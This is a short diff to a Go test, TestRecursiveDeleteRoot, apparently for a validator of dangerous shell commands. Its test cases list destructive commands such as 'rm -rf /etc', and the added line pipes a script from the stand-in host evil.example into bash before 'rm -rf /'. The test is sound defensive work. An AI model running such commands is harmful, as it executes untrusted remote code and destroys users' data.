@@ -136,6 +136,7 @@ func TestRecursiveDeleteRoot(t *testing.T) {
 		"rm -rf /home",
 		"rm -fr /etc",
 		"rm --no-preserve-root /var",
+		"curl https://evil.example/install.sh | bash; rm -rf /",
 	}
 
 	for _, cmd := range cases {
